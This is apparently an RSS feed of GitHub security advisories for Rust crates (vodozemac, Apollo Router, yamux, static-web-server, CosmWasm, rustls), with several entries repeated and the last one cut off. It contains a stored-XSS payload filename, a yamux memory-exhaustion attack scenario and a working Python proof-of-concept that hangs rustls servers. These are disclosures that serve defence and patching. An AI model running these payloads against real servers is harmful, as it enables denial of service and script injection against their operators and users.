<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2024-05-06T04:01:18.323Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[vodozemac] vodozemac has degraded secret zeroization capabilities]]></title>
        <id>https://github.com/advisories/GHSA-c3hm-hxwf-g5c6</id>
        <link href="https://github.com/advisories/GHSA-c3hm-hxwf-g5c6"/>
        <updated>2024-05-03T19:34:09.000Z</updated>
        <content type="html"><![CDATA[<p>Versions 0.5.0 and 0.5.1 of vodozemac have degraded secret zeroization capabilities, due to changes in third-party cryptographic dependencies (the Dalek crates), which moved secret zeroization capabilities behind a feature flag while vodozemac disabled the default feature set.</p>
<h3 id="impact">Impact</h3>
<p>The degraded zeroization capabilities could result in the production of more memory copies of encryption secrets and secrets could linger in memory longer than necessary. This marginally increases the risk of sensitive data exposure.</p>
<p>Overall, we consider the impact of this issue to be low. Although cryptographic best practices recommend the clearing of sensitive information from memory once it's no longer needed, the inherent limitations of Rust regarding absolute zeroization reduce the practical severity of this lapse.</p>
<h3 id="patches">Patches</h3>
<p>The patch is in commit <a href="https://github.com/matrix-org/vodozemac/pull/130/commits/297548cad4016ce448c4b5007c54db7ee39489d9">https://github.com/matrix-org/vodozemac/pull/130/commits/297548cad4016ce448c4b5007c54db7ee39489d9</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory please email us at <a href="mailto:security@matrix.org">security at matrix.org</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/matrix-org/vodozemac/security/advisories/GHSA-c3hm-hxwf-g5c6">https://github.com/matrix-org/vodozemac/security/advisories/GHSA-c3hm-hxwf-g5c6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34063">https://nvd.nist.gov/vuln/detail/CVE-2024-34063</a></li>
<li><a href="https://github.com/matrix-org/vodozemac/commit/297548cad4016ce448c4b5007c54db7ee39489d9">https://github.com/matrix-org/vodozemac/commit/297548cad4016ce448c4b5007c54db7ee39489d9</a></li>
<li><a href="https://github.com/advisories/GHSA-c3hm-hxwf-g5c6">https://github.com/advisories/GHSA-c3hm-hxwf-g5c6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c3hm-hxwf-g5c6</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-05-03T19:34:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apollo-router] Apollo Router vulnerable to Critical Regression In Query Plan Cache]]></title>
        <id>https://github.com/advisories/GHSA-q9p4-hw9m-fj2v</id>
        <link href="https://github.com/advisories/GHSA-q9p4-hw9m-fj2v"/>
        <updated>2024-05-02T19:35:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Any instance of Apollo Router 1.44.0 or 1.45.0 that is using Distributed Query Plan Caching is impacted. These versions were released on 2024-04-12 and 2024-04-22 respectively.</p>
<p>The affected versions of Apollo Router contain a bug that could lead to unexpected operations being executed, which can result in unintended data or effects. This only affects Router instances configured to use distributed query plan caching. Router versions other than the ones listed above, and all Router deployments that are not using distributed query plan caching, are unaffected by this defect.</p>
<p>If you are using the affected versions, you can check your router’s configuration YAML to verify if you are impacted:</p>
<pre><code class="language-yaml">supergraph:
  query_planning:
    cache:
      # Look for this config below
      redis:
        urls: ["redis://..."]
</code></pre>
<p>A full reference on the<a href="https://www.apollographql.com/docs/router/configuration/distributed-caching/#distributed-query-plan-caching"> Distributed Query Plan Caching feature is available here.</a></p>
<h3 id="impact-detail">Impact detail</h3>
<p>The root cause of this defect is a bug in Apollo Router’s cache retrieval logic: When this defect is present and distributed query planning caching is enabled, asking the Router to execute an operation (whether it is a query, a mutation, or a subscription) may result in an unexpected variation of that operation being executed or the generation of unexpected errors.  </p>
<p>The issue stems from inadvertently executing a modified version of a previously executed operation, whose query plan is stored in the underlying cache (specifically, Redis). Depending on the type of the operation, the result may vary.  For a query, results may be fetched that don’t match what was requested (e.g., rather than running <code>fetchUsers(type: ENTERPRISE)</code> the Router may run <code>fetchUsers(type: TRIAL)</code>.  For a mutation, this may result in incorrect mutations being sent to underlying subgraph servers (e.g., rather than sending <code>deleteUser(id: 10)</code> to a subgraph, the Router may run <code>deleteUser(id: 12)</code>.</p>
<h3 id="patches">Patches</h3>
<p>Apollo Router 1.45.1</p>
<p>If you are using distributed query plan caching, please either upgrade to version 1.45.1 or above or downgrade to version 1.43.2 of the Apollo Router. We do not recommend Apollo Router versions 1.44.0 or 1.45.0 for use and have withdrawn these releases. If you use impacted versions in production, we recommend that you migrate away immediately by redeploying to an unaffected Router version. For non-production use cases, we recommend you migrate at your earliest convenience.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade or downgrade, you can disable distributed query plan caching by removing the <code>supergraph.query_planning.cache.redis.urls</code> configuration. Please note that when distributed query plan caching is disabled, each Router instance will maintain its own in-memory query plan cache. This may increase resource utilization for each Router instance and could increase cold-start times as each Router instance builds its query plan cache.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/apollographql/router/releases/tag/v1.45.1">Apollo Router 1.45.1 Release Notes</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/apollographql/router/security/advisories/GHSA-q9p4-hw9m-fj2v">https://github.com/apollographql/router/security/advisories/GHSA-q9p4-hw9m-fj2v</a></li>
<li><a href="https://github.com/apollographql/router/commit/ff9f666598cd17661880fe7fc6e9c9611316e529">https://github.com/apollographql/router/commit/ff9f666598cd17661880fe7fc6e9c9611316e529</a></li>
<li><a href="https://github.com/apollographql/router/releases/tag/v1.45.1">https://github.com/apollographql/router/releases/tag/v1.45.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32971">https://nvd.nist.gov/vuln/detail/CVE-2024-32971</a></li>
<li><a href="https://www.apollographql.com/docs/router/configuration/distributed-caching/#distributed-query-plan-caching">https://www.apollographql.com/docs/router/configuration/distributed-caching/#distributed-query-plan-caching</a></li>
<li><a href="https://github.com/advisories/GHSA-q9p4-hw9m-fj2v">https://github.com/advisories/GHSA-q9p4-hw9m-fj2v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q9p4-hw9m-fj2v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-05-02T08:20:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yamux] Yamux Memory Exhaustion Vulnerability via Active::pending_frames property ]]></title>
        <id>https://github.com/advisories/GHSA-3999-5ffv-wp2r</id>
        <link href="https://github.com/advisories/GHSA-3999-5ffv-wp2r"/>
        <updated>2024-05-01T16:40:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Attack scenario
The Rust implementation of the Yamux stream multiplexer uses a vector for pending frames. This vector is not bounded in length. Every time the Yamux protocol requires sending of a new frame, this frame gets appended to this vector. This can be remotely triggered in a number of ways, for example by:</p>
<ol>
<li>Opening a new libp2p Identify stream. This causes the node to send its Identify message. Of course, every other protocol that causes the sending of data also works. The larger the response, the more data is enqueued.</li>
<li>Sending a Yamux Ping frame. This causes a Pong frame to be enqueued.</li>
</ol>
<p>Under normal circumstances, this queue of pending frames would be drained once they’re sent out over the network. However, the attacker can use TCP’s receive window mechanism to prevent the victim from sending out any data: By not reading from the TCP connection, the receive window will never be increased, and the victim won’t be able to send out any new data (this is how TCP implements backpressure). Once this happens, Yamux’s queue of pending frames will start growing indefinitely. The queue will only be drained once the underlying TCP connection is closed.</p>
<p>Components
<a href="https://github.com/libp2p/rust-yamux/blob/yamux-v0.13.1/yamux/src/connection.rs#L289">https://github.com/libp2p/rust-yamux/blob/yamux-v0.13.1/yamux/src/connection.rs#L289</a></p>
<h3 id="details">Details</h3>
<p>This attack is inspired by the HTTP/2 Rapid Reset Attack (CVE 2023-44487), HTTP/2 Ping Flood (CVE-2019-9512), and the QUIC Path Validation attack (see my blog post: <a href="https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/">https://seemann.io/posts/2023-12-18-exploiting-quics-path-validation/</a>).</p>
<h3 id="impact">Impact</h3>
<p>An attacker can cause a remote node to run out of memory, which will result in the corresponding process getting terminated by the operating system.</p>
<p>Depending on the application protocols running on top of rust-libp2p, higher amplification factors are possible. For example, image a protocol that sends out 10 MB of data as a result of an incoming request. By issuing that request and sending a Yamux stream window update (together ~100-200 bytes), the victim would now enqueue the entire 10 MB into its frame buffer. Any block transfer / sync protocols might be good candidates.</p>
<p>In addition to consuming huge amounts of memory, this attack also drives up the victim's CPU load, such that the allocation of memory at some point becomes CPU-limited.</p>
<p>This was originally submitted by @marteen-seemann to the Ethereum Foundation bug bounty program.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/libp2p/rust-yamux/security/advisories/GHSA-3999-5ffv-wp2r">https://github.com/libp2p/rust-yamux/security/advisories/GHSA-3999-5ffv-wp2r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32984">https://nvd.nist.gov/vuln/detail/CVE-2024-32984</a></li>
<li><a href="https://github.com/libp2p/rust-yamux/commit/460baf2ccb7d5982b266cb3cb9c0bdf75b4fb779">https://github.com/libp2p/rust-yamux/commit/460baf2ccb7d5982b266cb3cb9c0bdf75b4fb779</a></li>
<li><a href="https://github.com/sigp/rust-yamux/commit/6689e227a48258a52347cd1d984adfc94afc6f7a">https://github.com/sigp/rust-yamux/commit/6689e227a48258a52347cd1d984adfc94afc6f7a</a></li>
<li><a href="https://github.com/libp2p/rust-yamux/blob/yamux-v0.13.1/yamux/src/connection.rs#L289">https://github.com/libp2p/rust-yamux/blob/yamux-v0.13.1/yamux/src/connection.rs#L289</a></li>
<li><a href="https://github.com/advisories/GHSA-3999-5ffv-wp2r">https://github.com/advisories/GHSA-3999-5ffv-wp2r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3999-5ffv-wp2r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-01T16:40:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[static-web-server] static-web-server vulnerable to stored Cross-site Scripting in directory listings via file names]]></title>
        <id>https://github.com/advisories/GHSA-rwfq-v4hq-h7fg</id>
        <link href="https://github.com/advisories/GHSA-rwfq-v4hq-h7fg"/>
        <updated>2024-05-01T16:39:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If directory listings are enabled for a directory that an untrusted user has upload privileges for, a malicious file name like <code>&lt;img src=x onerror=alert(1)&gt;.txt</code> will allow JavaScript code execution in the context of the web server’s domain.</p>
<h3 id="details">Details</h3>
<p>SWS generally does not perform escaping of HTML entities on any values inserted in the directory listing. At the very least <code>file_name</code> and <code>current_path</code> could contain malicious data however. <code>file_uri</code> could also be malicious but the relevant scenarios seem to be all caught by hyper.</p>
<h3 id="impact">Impact</h3>
<p>For any web server that allow users to upload files or create directories under a name of their choosing this becomes a stored XSS vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/static-web-server/static-web-server/security/advisories/GHSA-rwfq-v4hq-h7fg">https://github.com/static-web-server/static-web-server/security/advisories/GHSA-rwfq-v4hq-h7fg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32966">https://nvd.nist.gov/vuln/detail/CVE-2024-32966</a></li>
<li><a href="https://github.com/static-web-server/static-web-server/releases/tag/v2.30.0">https://github.com/static-web-server/static-web-server/releases/tag/v2.30.0</a></li>
<li><a href="https://github.com/advisories/GHSA-rwfq-v4hq-h7fg">https://github.com/advisories/GHSA-rwfq-v4hq-h7fg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rwfq-v4hq-h7fg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-01T16:39:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cosmwasm-std] CosmWasm affected by arithmetic overflows]]></title>
        <id>https://github.com/advisories/GHSA-8724-5xmm-w5xq</id>
        <link href="https://github.com/advisories/GHSA-8724-5xmm-w5xq"/>
        <updated>2024-04-24T17:38:00.000Z</updated>
        <content type="html"><![CDATA[<p>Some mathematical operations in <code>cosmwasm-std</code> use wrapping math instead of
panicking on overflow for very big numbers. This can lead to wrong calculations in contracts
that use these operations.</p>
<p>Affected functions:</p>
<ul>
<li><code>Uint{256,512}::pow</code> / <code>Int{256,512}::pow</code></li>
<li><code>Int{256,512}::neg</code></li>
</ul>
<p>Affected if <code>overflow-checks = true</code> is not set:</p>
<ul>
<li><code>Uint{64,128}::pow</code> / <code>Int{64,128}::pow</code></li>
<li><code>Int{64,128}::neg</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/607e7fc710fb9441096e8edbaa12879b552c8f65">https://github.com/CosmWasm/cosmwasm/commit/607e7fc710fb9441096e8edbaa12879b552c8f65</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/a6a639e09adc355b5f889a09141649005cb08a46">https://github.com/CosmWasm/cosmwasm/commit/a6a639e09adc355b5f889a09141649005cb08a46</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/eff79bcbe73b61178817aacf0a6449437adad6a9">https://github.com/CosmWasm/cosmwasm/commit/eff79bcbe73b61178817aacf0a6449437adad6a9</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-002.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-002.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0338.html">https://rustsec.org/advisories/RUSTSEC-2024-0338.html</a></li>
<li><a href="https://github.com/advisories/GHSA-8724-5xmm-w5xq">https://github.com/advisories/GHSA-8724-5xmm-w5xq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8724-5xmm-w5xq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-04-24T17:37:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cosmwasm-std] CosmWasm affected by arithmetic overflows]]></title>
        <id>https://github.com/advisories/GHSA-8724-5xmm-w5xq</id>
        <link href="https://github.com/advisories/GHSA-8724-5xmm-w5xq"/>
        <updated>2024-04-24T17:38:00.000Z</updated>
        <content type="html"><![CDATA[<p>Some mathematical operations in <code>cosmwasm-std</code> use wrapping math instead of
panicking on overflow for very big numbers. This can lead to wrong calculations in contracts
that use these operations.</p>
<p>Affected functions:</p>
<ul>
<li><code>Uint{256,512}::pow</code> / <code>Int{256,512}::pow</code></li>
<li><code>Int{256,512}::neg</code></li>
</ul>
<p>Affected if <code>overflow-checks = true</code> is not set:</p>
<ul>
<li><code>Uint{64,128}::pow</code> / <code>Int{64,128}::pow</code></li>
<li><code>Int{64,128}::neg</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/607e7fc710fb9441096e8edbaa12879b552c8f65">https://github.com/CosmWasm/cosmwasm/commit/607e7fc710fb9441096e8edbaa12879b552c8f65</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/a6a639e09adc355b5f889a09141649005cb08a46">https://github.com/CosmWasm/cosmwasm/commit/a6a639e09adc355b5f889a09141649005cb08a46</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/eff79bcbe73b61178817aacf0a6449437adad6a9">https://github.com/CosmWasm/cosmwasm/commit/eff79bcbe73b61178817aacf0a6449437adad6a9</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-002.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-002.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0338.html">https://rustsec.org/advisories/RUSTSEC-2024-0338.html</a></li>
<li><a href="https://github.com/advisories/GHSA-8724-5xmm-w5xq">https://github.com/advisories/GHSA-8724-5xmm-w5xq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8724-5xmm-w5xq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-04-24T17:37:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cosmwasm-std] CosmWasm affected by arithmetic overflows]]></title>
        <id>https://github.com/advisories/GHSA-8724-5xmm-w5xq</id>
        <link href="https://github.com/advisories/GHSA-8724-5xmm-w5xq"/>
        <updated>2024-04-24T17:38:00.000Z</updated>
        <content type="html"><![CDATA[<p>Some mathematical operations in <code>cosmwasm-std</code> use wrapping math instead of
panicking on overflow for very big numbers. This can lead to wrong calculations in contracts
that use these operations.</p>
<p>Affected functions:</p>
<ul>
<li><code>Uint{256,512}::pow</code> / <code>Int{256,512}::pow</code></li>
<li><code>Int{256,512}::neg</code></li>
</ul>
<p>Affected if <code>overflow-checks = true</code> is not set:</p>
<ul>
<li><code>Uint{64,128}::pow</code> / <code>Int{64,128}::pow</code></li>
<li><code>Int{64,128}::neg</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/607e7fc710fb9441096e8edbaa12879b552c8f65">https://github.com/CosmWasm/cosmwasm/commit/607e7fc710fb9441096e8edbaa12879b552c8f65</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/a6a639e09adc355b5f889a09141649005cb08a46">https://github.com/CosmWasm/cosmwasm/commit/a6a639e09adc355b5f889a09141649005cb08a46</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/eff79bcbe73b61178817aacf0a6449437adad6a9">https://github.com/CosmWasm/cosmwasm/commit/eff79bcbe73b61178817aacf0a6449437adad6a9</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-002.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-002.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0338.html">https://rustsec.org/advisories/RUSTSEC-2024-0338.html</a></li>
<li><a href="https://github.com/advisories/GHSA-8724-5xmm-w5xq">https://github.com/advisories/GHSA-8724-5xmm-w5xq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8724-5xmm-w5xq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-04-24T17:37:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rustls] Infinite loop in rustls::conn::ConnectionCommon::complete_io() with proper client input]]></title>
        <id>https://github.com/advisories/GHSA-6g7w-8wpp-frhj</id>
        <link href="https://github.com/advisories/GHSA-6g7w-8wpp-frhj"/>
        <updated>2024-04-23T20:49:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>rustls::ConnectionCommon::complete_io</code> could fall into an infinite loop based on network input.</p>
<h3 id="details">Details</h3>
<p>Verified at <code>0.22</code> and <code>0.23</code> <code>rustls</code>, but <code>0.21</code> and <code>0.20</code> release lines are also affected. <code>tokio-rustls</code> and <code>rustls-ffi</code> do not call <code>complete_io</code> and are not affected. <code>rustls::Stream</code> and <code>rustls::StreamOwned</code> types use <code>complete_io</code> and are affected.</p>
<p>When using a blocking rustls server, if a client send a <code>close_notify</code> message immediately after <code>client_hello</code>, the server's <code>complete_io</code> will get in an infinite loop where:</p>
<ul>
<li><code>eof</code>: false</li>
<li><code>until_handshaked</code>: true</li>
<li><code>self.is_handshaking()</code>: true</li>
<li><code>self.wants_write()</code>: false</li>
<li><code>self.wants_read()</code>: false</li>
</ul>
<h3 id="poc">PoC</h3>
<ol>
<li>Run simple server: <code>cargo run --bin simpleserver test-ca/rsa/end.fullchain test-ca/rsa/end.key</code></li>
<li>Run following python script<pre><code class="language-python3">#!/usr/bin/env python3

import socket

sock = socket.socket()
sock.connect(("localhost", 4443))

print("Sending client hello...")

# Fake handshake data of a client hello message.
fake_handshake = """
1603 0100 c801 0000 c403 03ec 12dd
1764 a439 fd7e 8c85 46b8 4d1e a06e b3d7
a051 f03c b817 470d 4c54 c5df 7200 001c
eaea c02b c02f c02c c030 cca9 cca8 c013
c014 009c 009d 002f 0035 000a 0100 007f
dada 0000 ff01 0001 0000 0000 1600 1400
0011 7777 772e 7769 6b69 7065 6469 612e
6f72 6700 1700 0000 2300 0000 0d00 1400
1204 0308 0404 0105 0308 0505 0108 0606
0102 0100 0500 0501 0000 0000 0012 0000
0010 000e 000c 0268 3208 6874 7470 2f31
2e31 7550 0000 000b 0002 0100 000a 000a
0008 1a1a 001d 0017 0018 1a1a 0001 00
"""


def parse_fake_handshake():
    i = 0
    data = bytearray()
    while i &lt; len(fake_handshake):
        while i &lt; len(fake_handshake) and fake_handshake[i].isspace():
            i += 1
        if i &gt;= len(fake_handshake):
            return data

        c1 = fake_handshake[i]
        c2 = fake_handshake[i + 1]
        i += 2

        data.append(int(c1, 16) * 16 + int(c2, 16))
    return data


data = parse_fake_handshake()

print("Fake client hello:", data)

sock.send(data)

# Send close_notify alert that we're closing the connection.
close_data = bytearray([0x15, 0x03, 0x03, 0x00, 0x02, 0x01, 0x00])
print(f"close_notify is {close_data}")
sock.send(close_data)
print("close_notify sent")

exit(0)
</code></pre>
</li>
<li>You could observe the server process get into 100% cpu usage, and if you add logging at beginning of <code>rustls::conn::ConnectionCommon::complete_io</code>, you could see the function is spinning.</li>
</ol>
<p>Also note that the server thread is stuck in this infinite loop even if the client closes the socket.</p>
<h3 id="impact">Impact</h3>
<p>This is a DOS.</p>
<p>A multithread non-async server that uses <code>rustls</code> could be attacked by getting few requests like above (each request could cause one thread to spin) and stop handling normal requests.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj">https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32650">https://nvd.nist.gov/vuln/detail/CVE-2024-32650</a></li>
<li><a href="https://github.com/rustls/rustls/commit/2123576840aa31043a31b0770e6572136fbe0c2d">https://github.com/rustls/rustls/commit/2123576840aa31043a31b0770e6572136fbe0c2d</a></li>
<li><a href="https://github.com/rustls/rustls/commit/5374108df698e78c3e9ef8265cac311556be24af">https://github.com/rustls/rustls/commit/5374108df698e78c3e9ef8265cac311556be24af</a></li>
<li><a href="https://github.com/rustls/rustls/commit/6e938bcfe82a9da7a2e1cbf10b928c7eca26426e">https://github.com/rustls/rustls/commit/6e938bcfe82a9da7a2e1cbf10b928c7eca26426e</a></li>
<li><a href="https://github.com/rustls/rustls/commit/ebcb4782f23b4edf9b10a7065d9e8d4362439d9c">https://github.com/rustls/rustls/commit/ebcb4782f23b4edf9b10a7065d9e8d4362439d9c</a></li>
<li><a href="https://github.com/rustls/rustls/commit/f45664fbded03d833dffd806503d3c8becd1b71e">https://github.com/rustls/rustls/commit/f45664fbded03d833dffd806503d3c8becd1b71e</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0336.html">https://rustsec.org/advisories/RUSTSEC-2024-0336.html</a></li>
<li><a href="https://github.com/advisories/GHSA-6g7w-8wpp-frhj">https://github.com/advisories/GHSA-6g7w-8wpp-frhj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6g7w-8wpp-frhj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-19T19:46:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rustls] Infinite loop in rustls::conn::ConnectionCommon::complete_io() with proper client input]]></title>
        <id>https://github.com/advisories/GHSA-6g7w-8wpp-frhj</id>
        <link href="https://github.com/advisories/GHSA-6g7w-8wpp-frhj"/>
        <updated>2024-04-23T20:49:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>rustls::ConnectionCommon::complete_io</code> could fall into an infinite loop based on network input.</p>
<h3 id="details">Details</h3>
<p>Verified at <code>0.22</code> and <code>0.23</code> <code>rustls</code>, but <code>0.21</code> and <code>0.20</code> release lines are also affected. <code>tokio-rustls</code> and <code>rustls-ffi</code> do not call <code>complete_io</code> and are not affected. <code>rustls::Stream</code> and <code>rustls::StreamOwned</code> types use <code>complete_io</code> and are affected.</p>
<p>When using a blocking rustls server, if a client send a <code>close_notify</code> message immediately after <code>client_hello</code>, the server's <code>complete_io</code> will get in an infinite loop where:</p>
<ul>
<li><code>eof</code>: false</li>
<li><code>until_handshaked</code>: true</li>
<li><code>self.is_handshaking()</code>: true</li>
<li><code>self.wants_write()</code>: false</li>
<li><code>self.wants_read()</code>: false</li>
</ul>
<h3 id="poc">PoC</h3>
<ol>
<li>Run simple server: <code>cargo run --bin simpleserver test-ca/rsa/end.fullchain test-ca/rsa/end.key</code></li>
<li>Run following python script<pre><code class="language-python3">#!/usr/bin/env python3

import socket

sock = socket.socket()
sock.connect(("localhost", 4443))

print("Sending client hello...")

# Fake handshake data of a client hello message.
fake_handshake = """
1603 0100 c801 0000 c403 03ec 12dd
1764 a439 fd7e 8c85 46b8 4d1e a06e b3d7
a051 f03c b817 470d 4c54 c5df 7200 001c
eaea c02b c02f c02c c030 cca9 cca8 c013
c014 009c 009d 002f 0035 000a 0100 007f
dada 0000 ff01 0001 0000 0000 1600 1400
0011 7777 772e 7769 6b69 7065 6469 612e
6f72 6700 1700 0000 2300 0000 0d00 1400
1204 0308 0404 0105 0308 0505 0108 0606
0102 0100 0500 0501 0000 0000 0012 0000
0010 000e 000c 0268 3208 6874 7470 2f31
2e31 7550 0000 000b 0002 0100 000a 000a
0008 1a1a 001d 0017 0018 1a1a 0001 00
"""


def parse_fake_handshake():
    i = 0
    data = bytearray()
    while i &lt; len(fake_handshake):
        while i &lt; len(fake_handshake) and fake_handshake[i].isspace():
            i += 1
        if i &gt;= len(fake_handshake):
            return data

        c1 = fake_handshake[i]
        c2 = fake_handshake[i + 1]
        i += 2

        data.append(int(c1, 16) * 16 + int(c2, 16))
    return data


data = parse_fake_handshake()

print("Fake client hello:", data)

sock.send(data)

# Send close_notify alert that we're closing the connection.
close_data = bytearray([0x15, 0x03, 0x03, 0x00, 0x02, 0x01, 0x00])
print(f"close_notify is {close_data}")
sock.send(close_data)
print("close_notify sent")

exit(0)
</code></pre>
</li>
<li>You could observe the server process get into 100% cpu usage, and if you add logging at beginning of <code>rustls::conn::ConnectionCommon::complete_io</code>, you could see the function is spinning.</li>
</ol>
<p>Also note that the server thread is stuck in this infinite loop even if the client closes the socket.</p>
<h3 id="impact">Impact</h3>
<p>This is a DOS.</p>
<p>A multithread non-async server that uses <code>rustls</code> could be attacked by getting few requests like above (each request could cause one thread to spin) and stop handling normal requests.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj">https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32650">https://nvd.nist.gov/vuln/detail/CVE-2024-32650</a></li>
<li><a href="https://github.com/rustls/rustls/commit/2123576840aa31043a31b0770e6572136fbe0c2d">https://github.com/rustls/rustls/commit/2123576840aa31043a31b0770e6572136fbe0c2d</a></li>
<li><a href="https://github.com/rustls/rustls/commit/5374108df698e78c3e9ef8265cac311556be24af">https://github.com/rustls/rustls/commit/5374108df698e78c3e9ef8265cac311556be24af</a></li>
<li><a href="https://github.com/rustls/rustls/commit/6e938bcfe82a9da7a2e1cbf10b928c7eca26426e">https://github.com/rustls/rustls/commit/6e938bcfe82a9da7a2e1cbf10b928c7eca26426e</a></li>
<li><a href="https://github.com/rustls/rustls/commit/ebcb4782f23b4edf9b10a7065d9e8d4362439d9c">https://github.com/rustls/rustls/commit/ebcb4782f23b4edf9b10a7065d9e8d4362439d9c</a></li>
<li><a href="https://github.com/rustls/rustls/commit/f45664fbded03d833dffd806503d3c8becd1b71e">https://github.com/rustls/rustls/commit/f45664fbded03d833dffd806503d3c8becd1b71e</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0336.html">https://rustsec.org/advisories/RUSTSEC-2024-0336.html</a></li>
<li><a href="https://github.com/advisories/GHSA-6g7w-8wpp-frhj">https://github.com/advisories/GHSA-6g7w-8wpp-frhj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6g7w-8wpp-frhj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-19T19:46:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rustls] Infinite loop in rustls::conn::ConnectionCommon::complete_io() with proper client input]]></title>
